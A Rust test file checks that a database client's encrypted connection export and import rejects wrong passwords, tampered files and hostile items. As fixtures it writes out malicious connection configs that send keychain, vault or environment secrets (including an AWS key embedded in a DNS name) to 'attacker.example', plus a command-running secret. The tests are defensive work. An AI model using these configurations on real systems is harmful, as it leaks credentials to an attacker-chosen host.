//! Moving personal connections between computers in an encrypted file (ADR-088), with
//! temporary folders and a fake keychain on each "computer" (the real keychain is never
//! touched). The cases try to get around it: a wrong password, a changed file, an item that
//! runs a program, a repository connection, a keychain that fails halfway.

use crate::common;

use common::{FakeBackend, personal};
use spelaion_config::{
    ConnectionsFileError, ItemKind, ItemOutcome, ItemState, Password, Resolver, TransferError,
    TrustStore, connection_account, export_connections, import_connections, load,
    preview_connections_import, tunnel_account,
};
use spelaion_driver_api::Secret;
use std::path::{Path, PathBuf};

const ORDERS: &str = "schema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"orders.internal\"\ndatabase = \"orders\"\nuser = \"app\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n";
const NAMED: &str = "schema_version = 1\nname = \"Shared login\"\nengine = \"mysql\"\nhost = \"db\"\nuser = \"me\"\npassword = { secret = \"keychain:my-login\" }\n";
const FROM_ENV: &str = "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"app\"\nuser = \"me\"\npassword = { secret = \"env:DB_PASSWORD\" }\n";
const RUNS: &str = "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"app\"\nuser = \"me\"\npassword = { secret = \"cmd:echo hunter2\" }\n";
const BASTION: &str = "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"ops\"\nauth = [\"password\"]\npassword = { secret = \"keychain\" }\n";
const PASSWORD: &str = "a long export password";

struct Computer {
    base: PathBuf,
    backend: FakeBackend,
}

impl Computer {
    fn new(name: &str) -> Self {
        let base = std::env::temp_dir().join(format!(
            "spelaion-connection-transfer-{name}-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join("user")).unwrap();
        Self {
            base,
            backend: FakeBackend::default(),
        }
    }

    fn user(&self) -> PathBuf {
        self.base.join("user")
    }

    fn write(&self, relative: &str, text: &str) {
        let path = self.user().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn config(&self) -> spelaion_config::Config {
        load(None, &self.user())
    }

    fn keychain(&self, account: &str) -> Option<String> {
        self.backend.keychain.lock().unwrap().get(account).cloned()
    }

    fn set_keychain(&self, account: &str, value: &str) {
        self.backend
            .keychain
            .lock()
            .unwrap()
            .insert(account.into(), value.into());
    }
}

impl Drop for Computer {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.base);
    }
}

fn secret(text: &str) -> Secret {
    Secret::new(text.to_string())
}

/// The old computer: three personal connections, a personal profile, their passwords in the
/// keychain, a connection that runs a program, and a repository connection.
fn old_computer(name: &str) -> Computer {
    let old = Computer::new(&format!("{name}-old"));
    old.write("connections/orders.toml", ORDERS);
    old.write("connections/team/shared.toml", NAMED);
    old.write("connections/from-env.toml", FROM_ENV);
    old.write("connections/runs.toml", RUNS);
    old.write("tunnels/bastion.toml", BASTION);
    let config = old.config();
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    old.set_keychain(
        &connection_account(&config, &personal("orders")),
        "orders-password",
    );
    old.set_keychain("my-login", "shared-password");
    old.set_keychain(
        &tunnel_account(&config, spelaion_config::Source::User, "bastion", 0),
        "bastion-password",
    );
    old
}

fn export(old: &Computer, ids: &[&str]) -> Vec<u8> {
    let file = old.base.join("connections.spelaion-connections");
    let ids: Vec<String> = ids.iter().map(|s| s.to_string()).collect();
    export_connections(
        &old.config(),
        &old.backend,
        &ids,
        &secret(PASSWORD),
        "0.18.0",
        "2026-11-26T00:00:00Z",
        &file,
    )
    .unwrap();
    std::fs::read(file).unwrap()
}

fn files_under(dir: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                found.extend(files_under(&path));
            } else {
                found.push(path);
            }
        }
    }
    found
}

#[test]
fn connections_move_with_their_passwords_back_in_the_keychain() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = old_computer("move");
    let bytes = export(&old, &[]);
    for value in [
        "orders-password",
        "shared-password",
        "bastion-password",
        "orders.internal",
    ] {
        assert!(
            !bytes.windows(value.len()).any(|w| w == value.as_bytes()),
            "{value} is readable in the file"
        );
    }

    let new = Computer::new("new");
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    let state = |id: &str| {
        preview
            .iter()
            .find(|item| item.id == id)
            .unwrap_or_else(|| panic!("{id} not in {preview:?}"))
            .state
            .clone()
    };
    assert_eq!(state("bastion"), ItemState::New);
    assert_eq!(state("orders"), ItemState::New);
    assert_eq!(state("team/shared"), ItemState::New);
    assert!(matches!(state("from-env"), ItemState::Refused(_)));
    assert!(matches!(state("runs"), ItemState::Refused(_)));
    assert!(
        files_under(&new.user()).is_empty(),
        "a preview writes nothing"
    );

    let results = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    for (kind, id, outcome) in [
        (ItemKind::NetworkProfile, "bastion", ItemOutcome::Added),
        (ItemKind::Connection, "orders", ItemOutcome::Added),
        (ItemKind::Connection, "team/shared", ItemOutcome::Added),
    ] {
        let result = results.iter().find(|r| r.id == id).unwrap();
        assert_eq!((result.kind, &result.outcome), (kind, &outcome), "{id}");
    }
    for id in ["runs", "from-env"] {
        assert!(matches!(
            results.iter().find(|r| r.id == id).unwrap().outcome,
            ItemOutcome::NotImported(_)
        ));
    }
    assert!(!new.user().join("connections/runs.toml").exists());

    // The connections resolve with their passwords from this computer's keychain.
    let config = new.config();
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let trust = TrustStore::load(&new.user()).unwrap();
    let resolved = Resolver::new(&config, &trust, &new.backend)
        .resolve(&personal("orders"))
        .unwrap();
    assert!(matches!(&resolved.password, Password::Value(p) if p.expose() == "orders-password"));
    assert!(matches!(
        &resolved.tunnel.as_ref().unwrap().hops[0].password,
        Password::Value(p) if p.expose() == "bastion-password"
    ));
    assert_eq!(new.keychain("my-login").as_deref(), Some("shared-password"));
    // No password reached a file.
    for path in files_under(&new.user()) {
        let text = std::fs::read_to_string(&path).unwrap_or_default();
        for value in ["orders-password", "shared-password", "bastion-password"] {
            assert!(!text.contains(value), "{value} in {}", path.display());
        }
    }
}

#[test]
fn a_wrong_password_or_a_changed_file_writes_nothing() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = old_computer("refused");
    let bytes = export(&old, &["orders"]);
    let new = Computer::new("refused");
    let wrong = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret("not the password at all"),
        &[],
        &[],
    );
    assert!(matches!(
        wrong,
        Err(TransferError::File(
            ConnectionsFileError::WrongPasswordOrChanged
        ))
    ));
    for at in [bytes.len() / 2, bytes.len() - 1, 30] {
        let mut changed = bytes.clone();
        changed[at] ^= 0x80;
        let result =
            preview_connections_import(&new.config(), &new.backend, &changed, &secret(PASSWORD));
        assert!(
            matches!(
                result,
                Err(TransferError::File(
                    ConnectionsFileError::WrongPasswordOrChanged
                ))
            ),
            "byte {at}: {result:?}"
        );
    }
    let mut not_ours = bytes.clone();
    not_ours[0] = b'X';
    assert!(matches!(
        preview_connections_import(&new.config(), &new.backend, &not_ours, &secret(PASSWORD)),
        Err(TransferError::File(
            ConnectionsFileError::NotAConnectionsFile
        ))
    ));
    assert!(files_under(&new.user()).is_empty());
    assert!(new.backend.keychain.lock().unwrap().is_empty());
}

#[test]
fn only_personal_connections_are_exported() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = old_computer("personal");
    let repo = old.base.join("repo");
    std::fs::create_dir_all(repo.join(".spelaion/connections")).unwrap();
    std::fs::write(
        repo.join(".spelaion/connections/team-db.toml"),
        "schema_version = 1\nengine = \"postgres\"\nhost = \"team\"\ndatabase = \"team\"\nuser = \"app\"\n",
    )
    .unwrap();
    let config = load(Some(&repo), &old.user());
    assert!(
        config.connections.iter().any(|c| c.id.path == "team-db"),
        "{:?} {:?}",
        config.workspace_root,
        config.problems
    );
    let file = old.base.join("all.spelaion-connections");
    let exported = export_connections(
        &config,
        &old.backend,
        &[],
        &secret(PASSWORD),
        "0.18.0",
        "now",
        &file,
    )
    .unwrap();
    assert_eq!(exported.connections, 4, "the four personal ones");
    let new = Computer::new("personal-only");
    let preview = preview_connections_import(
        &new.config(),
        &new.backend,
        &std::fs::read(&file).unwrap(),
        &secret(PASSWORD),
    )
    .unwrap();
    assert!(preview.iter().all(|item| item.id != "team-db"));
    // Naming a repository connection is refused: it is not personal.
    assert!(matches!(
        export_connections(
            &config,
            &old.backend,
            &["team-db".to_string()],
            &secret(PASSWORD),
            "0.18.0",
            "now",
            &file,
        ),
        Err(TransferError::UnknownConnection(_))
    ));
    // A short password is refused before anything is written.
    let short = old.base.join("short.spelaion-connections");
    assert!(matches!(
        export_connections(
            &config,
            &old.backend,
            &[],
            &secret("short"),
            "0.18.0",
            "now",
            &short
        ),
        Err(TransferError::File(ConnectionsFileError::PasswordTooShort))
    ));
    assert!(!short.exists());
}

#[test]
fn an_existing_connection_is_replaced_only_when_asked() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = old_computer("existing");
    let bytes = export(&old, &["orders"]);
    let new = Computer::new("existing");
    let mine = "schema_version = 1\nname = \"Mine\"\nengine = \"sqlite\"\ndatabase = \"mine.db\"\n";
    new.write("connections/orders.toml", mine);
    let account = connection_account(&new.config(), &personal("orders"));
    new.set_keychain(&account, "my-own-password");
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    assert_eq!(
        preview.iter().find(|i| i.id == "orders").unwrap().state,
        ItemState::Exists
    );
    let skipped = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    assert_eq!(
        skipped.iter().find(|r| r.id == "orders").unwrap().outcome,
        ItemOutcome::Skipped
    );
    assert_eq!(
        std::fs::read_to_string(new.user().join("connections/orders.toml")).unwrap(),
        mine
    );
    assert_eq!(new.keychain(&account).as_deref(), Some("my-own-password"));
    let replaced = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &["orders".to_string()],
        &[],
    )
    .unwrap();
    assert_eq!(
        replaced.iter().find(|r| r.id == "orders").unwrap().outcome,
        ItemOutcome::Replaced
    );
    assert_eq!(new.keychain(&account).as_deref(), Some("orders-password"));
}

#[test]
fn a_keychain_that_fails_leaves_the_item_out_and_the_keychain_as_it_was() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = old_computer("keychain");
    let bytes = export(&old, &["orders"]);
    let mut new = Computer::new("keychain-fails");
    new.backend = FakeBackend {
        fail_set: true,
        ..FakeBackend::default()
    };
    let results = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    for id in ["bastion", "orders"] {
        let outcome = &results.iter().find(|r| r.id == id).unwrap().outcome;
        assert!(
            matches!(
                outcome,
                ItemOutcome::Failed(_) | ItemOutcome::NotImported(_)
            ),
            "{id}: {outcome:?}"
        );
    }
    assert!(!new.user().join("tunnels/bastion.toml").exists());
    assert!(!new.user().join("connections/orders.toml").exists());
    assert!(new.backend.keychain.lock().unwrap().is_empty());
}

#[test]
fn a_profile_that_runs_a_program_keeps_its_connections_out() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = Computer::new("program-profile");
    old.write("connections/orders.toml", ORDERS);
    old.write(
        "tunnels/bastion.toml",
        "schema_version = 1\n\n[[hops]]\nhost = \"jump\"\nuser = \"ops\"\ncommand = \"ssh -W %h:%p jump\"\n",
    );
    let bytes = export(&old, &[]);
    let new = Computer::new("program-profile-new");
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    assert!(
        preview
            .iter()
            .all(|item| matches!(item.state, ItemState::Refused(_))),
        "{preview:?}"
    );
    import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    assert!(files_under(&new.user()).is_empty());
}

#[test]
fn a_file_cannot_send_another_secret_or_the_environment_to_a_server_it_chooses() {
    let _turn = crate::serial::file_turn(module_path!());
    let old = Computer::new("exfiltrate-old");
    // On the old computer a personal connection that reads a team connection's keychain entry
    // by name: the export never carries that entry's value.
    let team_entry = "repo:C:/work/shop/prod/orders/password";
    old.set_keychain(team_entry, "the-team-password");
    let steal = format!(
        "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = {{ secret = \"keychain:{team_entry}\" }}\n"
    );
    old.write("connections/steal.toml", &steal);
    old.write(
        "connections/dns.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"${env:AWS_SECRET_ACCESS_KEY}.attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\n",
    );
    old.write(
        "connections/vault.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = { secret = \"op://Private/bank/password\" }\n",
    );
    old.write("connections/shared.toml", NAMED);
    old.set_keychain("my-login", "shared-password");
    old.write(
        "tunnels/hop.toml",
        &format!(
            "schema_version = 1\n\n[[hops]]\nhost = \"jump\"\nuser = \"ops\"\nauth = [\"password\"]\npassword = {{ secret = \"keychain:{team_entry}\" }}\n"
        ),
    );
    old.write(
        "connections/through.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"x\"\nuser = \"me\"\ntunnel = \"hop\"\n",
    );
    let config = old.config();
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let file = old.base.join("all.spelaion-connections");
    let exported = export_connections(
        &config,
        &old.backend,
        &[],
        &secret(PASSWORD),
        "0.18.0",
        "now",
        &file,
    )
    .unwrap();
    assert_eq!(
        exported.secrets, 1,
        "only the user's own named entry is carried, never another connection's"
    );
    let bytes = std::fs::read(&file).unwrap();
    assert!(
        !bytes
            .windows("the-team-password".len())
            .any(|w| w == b"the-team-password")
    );

    let new = Computer::new("exfiltrate-new");
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    for id in ["steal", "dns", "vault", "hop", "through"] {
        let item = preview.iter().find(|item| item.id == id).unwrap();
        assert!(
            matches!(item.state, ItemState::Refused(_)),
            "{id}: {:?}",
            item.state
        );
    }
    assert_eq!(
        preview
            .iter()
            .find(|item| item.id == "shared")
            .unwrap()
            .state,
        ItemState::New
    );
    import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    let written: Vec<String> = files_under(&new.user())
        .iter()
        .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
        .collect();
    assert_eq!(written, vec!["shared.toml".to_string()], "{written:?}");
    assert_eq!(
        new.backend
            .keychain
            .lock()
            .unwrap()
            .keys()
            .cloned()
            .collect::<Vec<_>>(),
        vec!["my-login".to_string()]
    );
}

/// A connection that reads the keychain entry `prod-pass` by name and goes to a host the file
/// chose.
const NAMED_ELSEWHERE: &str = "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = { secret = \"keychain:prod-pass\" }\n";

#[test]
fn an_imported_connection_never_reads_a_password_this_computer_already_keeps() {
    let _turn = crate::serial::file_turn(module_path!());
    // The file names `prod-pass` but carries no value for it: the old computer had none.
    let old = Computer::new("reuse-old");
    old.write("connections/steal.toml", NAMED_ELSEWHERE);
    let bytes = export(&old, &[]);

    // This computer keeps a password under `prod-pass` for a connection of its own.
    let new = Computer::new("reuse-new");
    new.set_keychain("prod-pass", "the-real-production-password");
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    assert!(
        matches!(&preview[0].state, ItemState::Refused(why) if why.contains("does not carry")),
        "{preview:?}"
    );
    let results = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    assert!(matches!(results[0].outcome, ItemOutcome::NotImported(_)));
    assert!(!new.user().join("connections/steal.toml").exists());
    assert_eq!(
        new.keychain("prod-pass").as_deref(),
        Some("the-real-production-password")
    );

    // Carrying a value does not replace another password kept here under that name.
    let carrier = Computer::new("reuse-carrier");
    carrier.write("connections/steal.toml", NAMED_ELSEWHERE);
    carrier.set_keychain("prod-pass", "the-files-password");
    let bytes = export(&carrier, &[]);
    let preview =
        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
    assert!(
        matches!(&preview[0].state, ItemState::Refused(why) if why.contains("already holds")),
        "{preview:?}"
    );
    import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    assert!(!new.user().join("connections/steal.toml").exists());
    assert_eq!(
        new.keychain("prod-pass").as_deref(),
        Some("the-real-production-password")
    );

    // The same password under the same name is the user's own shared entry: imported.
    let same = Computer::new("reuse-same");
    same.set_keychain("prod-pass", "the-files-password");
    let preview =
        preview_connections_import(&same.config(), &same.backend, &bytes, &secret(PASSWORD))
            .unwrap();
    assert_eq!(preview[0].state, ItemState::New);
    import_connections(
        &same.config(),
        &same.backend,
        &bytes,
        &secret(PASSWORD),
        &[],
        &[],
    )
    .unwrap();
    assert!(same.user().join("connections/steal.toml").is_file());
}

#[test]
fn a_replaced_connection_without_a_password_in_the_file_never_reads_the_old_one() {
    let _turn = crate::serial::file_turn(module_path!());
    // The file's `orders` goes to another host and carries no password.
    let old = Computer::new("replace-blank-old");
    old.write(
        "connections/orders.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = { secret = \"keychain\" }\n",
    );
    let bytes = export(&old, &[]);

    let new = Computer::new("replace-blank-new");
    new.write(
        "connections/orders.toml",
        ORDERS.replace("tunnel = \"bastion\"\n", "").as_str(),
    );
    let account = connection_account(&new.config(), &personal("orders"));
    new.set_keychain(&account, "my-orders-password");
    let results = import_connections(
        &new.config(),
        &new.backend,
        &bytes,
        &secret(PASSWORD),
        &["orders".to_string()],
        &[],
    )
    .unwrap();
    assert_eq!(results[0].outcome, ItemOutcome::Replaced);
    // The old password is gone, not handed to the new host: it is asked when connecting.
    assert_eq!(new.keychain(&account), None);
    let config = new.config();
    let trust = TrustStore::load(&new.user()).unwrap();
    let resolved = Resolver::new(&config, &trust, &new.backend)
        .resolve(&personal("orders"))
        .unwrap();
    assert!(
        matches!(resolved.password, Password::Prompt { .. }),
        "{:?}",
        resolved.password
    );
}
